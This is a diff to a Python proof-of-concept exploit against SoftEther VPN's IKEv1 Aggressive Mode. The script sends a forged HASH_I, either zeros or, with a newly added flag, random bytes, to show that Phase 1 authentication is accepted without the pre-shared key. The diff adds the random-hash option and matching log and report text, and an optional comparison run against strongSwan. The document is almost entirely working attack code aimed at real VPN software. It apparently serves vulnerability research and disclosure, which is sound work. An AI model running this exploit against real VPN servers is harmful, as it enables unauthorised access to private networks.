@@ -37,6 +37,7 @@ Usage:
     python poc_softether_hash_i.py                        # default: 127.0.0.1 PSK=secret
     python poc_softether_hash_i.py --host 192.168.1.10 --psk mypsk
     python poc_softether_hash_i.py --wrong-psk            # prove PSK knowledge not required
+    python poc_softether_hash_i.py --random-hash          # random HASH_I, not just zeros
     python poc_softether_hash_i.py --compare 127.0.0.1   # run against strongSwan too
 """
 
@@ -69,17 +70,21 @@ BANNER = "=" * 70
 # ---------------------------------------------------------------------------
 
 class BogusHashIClient(IKEv1Client):
-    """IKEv1 Aggressive Mode initiator that sends a forged (all-zero) HASH_I."""
+    """IKEv1 Aggressive Mode initiator that sends a forged HASH_I."""
 
-    def __init__(self, cfg: IKEv1Config, fake_hash: bytes | None = None) -> None:
+    def __init__(self, cfg: IKEv1Config, fake_hash: bytes | None = None,
+                 random_hash: bool = False) -> None:
         super().__init__(cfg)
-        self._fake_hash = fake_hash  # None → zeroed bytes of correct length
+        self._fake_hash   = fake_hash    # explicit bytes; takes precedence
+        self._random_hash = random_hash  # True → os.urandom each call
 
     # Override: return garbage instead of prf(SKEYID, …)
     def _compute_hash_i(self) -> bytes:
         length = self.cfg.hash_info.output_len
         if self._fake_hash is not None:
             return (self._fake_hash + b"\x00" * length)[:length]
+        if self._random_hash:
+            return os.urandom(length)
         return b"\x00" * length
 
     # Override: skip HASH_R check so a mismatched PSK doesn't abort the test
@@ -148,7 +153,8 @@ class BogusHashIClient(IKEv1Client):
             self.log.set_phase("AGG-AUTH")
             bogus = self._compute_hash_i()
             result["hash_i_sent"] = bogus.hex()
-            self.log.warn(f"[PoC] HASH_I forged: {bogus.hex()}")
+            mode_tag = "random" if self._random_hash else "all-zero"
+            self.log.warn(f"[PoC] HASH_I forged ({mode_tag}): {bogus.hex()}")
 
             hash_pld = self._build_generic_v1(V1_PAYLOAD_NONE, bogus)
             ct, _    = self._encrypt_v1(hash_pld, self.phase1_iv)
@@ -156,7 +162,7 @@ class BogusHashIClient(IKEv1Client):
                 V1_EXCHANGE_AGGRESSIVE, V1_FLAG_ENCRYPTION, 0,
                 V1_PAYLOAD_HASH, 28 + len(ct)
             ) + ct
-            self.log.info(f"→ Msg 3 ({len(pkt3)}B): HASH_I [FORGED / all-zero]")
+            self.log.info(f"→ Msg 3 ({len(pkt3)}B): HASH_I [FORGED / {mode_tag}]")
 
             # Send msg 3, then wait briefly for an error Notify
             self._sock.sendto(pkt3, (self.cfg.host, self.cfg.port))
@@ -188,7 +194,8 @@ class BogusHashIClient(IKEv1Client):
 # Helpers
 # ---------------------------------------------------------------------------
 
-def _run_target(host: str, psk: str, dh_group: int, verbose: bool) -> dict:
+def _run_target(host: str, psk: str, dh_group: int, verbose: bool,
+                random_hash: bool = False) -> dict:
     cfg = IKEv1Config(
         host=host,
         mode="aggressive",
@@ -198,7 +205,7 @@ def _run_target(host: str, psk: str, dh_group: int, verbose: bool) -> dict:
         psk=psk,
         verbose=verbose,
     )
-    return BogusHashIClient(cfg).run_poc()
+    return BogusHashIClient(cfg, random_hash=random_hash).run_poc()
 
 
 def _print_result(label: str, result: dict) -> None:
@@ -209,11 +216,14 @@ def _print_result(label: str, result: dict) -> None:
         print("  [NO RESPONSE] Server did not reply to message 1 (is it running?)")
         return
     if result["accepted"]:
-        print("  [VULNERABLE] Phase 1 ACCEPTED with all-zero HASH_I")
+        hi = result["hash_i_sent"] or ""
+        is_zero = hi == "00" * (len(hi) // 2)
+        hi_desc = "all zeros" if is_zero else "random bytes"
+        print(f"  [VULNERABLE] Phase 1 ACCEPTED with {hi_desc} HASH_I")
         print()
         print(f"    host     : {result['host']}")
         print(f"    PSK used : {result['psk_used']!r}")
-        print(f"    HASH_I   : {result['hash_i_sent']} (all zeros)")
+        print(f"    HASH_I   : {hi} ({hi_desc})")
         print()
         print("  The responder never verified the initiator's identity.")
         print("  An attacker with no knowledge of the PSK can establish")
@@ -245,13 +255,18 @@ def main() -> None:
     parser.add_argument("--wrong-psk", action="store_true",
                         help="Use a completely wrong PSK to prove PSK knowledge is "
                              "not required for Phase 1 acceptance")
+    parser.add_argument("--random-hash", action="store_true",
+                        help="Send random bytes as HASH_I instead of all zeros, "
+                             "ruling out any special-case handling of the zero value")
     parser.add_argument("--compare",   metavar="STRONGSWAN_HOST",
                         help="Also run against a strongSwan host at this address and "
                              "compare results (strongSwan SHOULD reject)")
     parser.add_argument("--verbose", "-v", action="store_true")
     args = parser.parse_args()
 
-    psk = "definitely_not_the_psk_xyzzy_12345" if args.wrong_psk else args.psk
+    psk         = "definitely_not_the_psk_xyzzy_12345" if args.wrong_psk else args.psk
+    random_hash = args.random_hash
+    hash_desc   = "random bytes (os.urandom)" if random_hash else "all zeros (0x00…)"
 
     print(BANNER)
     print("  PoC: SoftEther IKEv1 Aggressive Mode — HASH_I Not Verified")
@@ -262,17 +277,21 @@ def main() -> None:
     print()
     print(f"  Target      : {args.host}:500")
     print(f"  PSK in use  : {psk!r}")
-    print(f"  HASH_I sent : <all zeros — {20} bytes of 0x00>")
+    print(f"  HASH_I sent : <{hash_desc}>")
     if args.wrong_psk:
         print()
         print("  NOTE: --wrong-psk mode — even the encryption keys are derived")
         print("  from the wrong PSK. SoftEther still cannot tell the difference.")
+    if random_hash:
+        print()
+        print("  NOTE: --random-hash mode — HASH_I is freshly randomised each run,")
+        print("  ruling out any special-case handling of the all-zero value.")
     print()
 
     # ── Test against SoftEther ───────────────────────────────────────────────
     print(f"Running exchange against SoftEther at {args.host} …")
     try:
-        se_result = _run_target(args.host, psk, args.dh_group, args.verbose)
+        se_result = _run_target(args.host, psk, args.dh_group, args.verbose, random_hash)
     except Exception as exc:
         print(f"[ERROR] {exc}")
         sys.exit(2)
@@ -284,7 +303,7 @@ def main() -> None:
     if args.compare:
         print(f"\nRunning comparison exchange against strongSwan at {args.compare} …")
         try:
-            ss_result = _run_target(args.compare, psk, args.dh_group, args.verbose)
+            ss_result = _run_target(args.compare, psk, args.dh_group, args.verbose, random_hash)
         except Exception as exc:
             print(f"[ERROR] strongSwan comparison failed: {exc}")
 
